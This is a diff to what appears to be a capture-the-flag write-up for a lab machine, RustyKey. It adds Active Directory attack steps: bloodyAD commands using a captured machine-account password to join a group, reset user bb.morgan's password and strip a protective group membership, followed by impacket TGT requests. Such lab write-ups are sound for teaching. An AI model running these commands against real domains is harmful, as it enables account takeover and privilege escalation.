@@ -84,6 +84,38 @@ This attack sends a malformed NTP (Network Time Protocol) request to the domain 
 
 <img width="1596" height="322" alt="image" src="https://github.com/user-attachments/assets/596dbb93-3b8e-4ae8-9bc4-5c2e1ad272c6" />
 
+Now let's add the computer to the HelpDesk group
+
+`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k add groupMember HelpDesk 'IT-COMPUTER3$' `
+
+<img width="672" height="44" alt="image" src="https://github.com/user-attachments/assets/ebf19a01-5aa9-4b12-8ec2-8ec7a7a9e6b6" />
+
+Next, we'll change the password for the user bb.morgan
+`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k set password bb.morgan 'GiorginaDellaGarbatella!'`
+
+<img width="662" height="45" alt="image" src="https://github.com/user-attachments/assets/4a9131f3-c39f-4ee7-af87-fb7e453f96ef" />
+
+When we try to request a TGT ticket, we get an error because the user is in the Protected Users group.
+More info: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group
+
+`impacket-getTGT rustykey.htb/bb.morgan:'GiorginaDellaGarbatella!' -dc-ip 10.129.232.127`
+
+<img width="766" height="76" alt="image" src="https://github.com/user-attachments/assets/17b4abee-1e86-4d0a-8ace-9736a0ed13d1" />
+
+To bypass this group, we need to remove Morgan from it.
+
+`bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'IT'`
+
+<img width="943" height="67" alt="image" src="https://github.com/user-attachments/assets/0ba34bcd-8f75-42b6-abfe-6aca35a4f930" />
+
+Now we can request TGT ticket for Morgan.
+
+`impacket-getTGT rustykey.htb/bb.morgan:'GiorginaDellaGarbatella!' -dc-ip 10.129.232.127`
+
+
+
+
+``
 ``
 ``
 ``
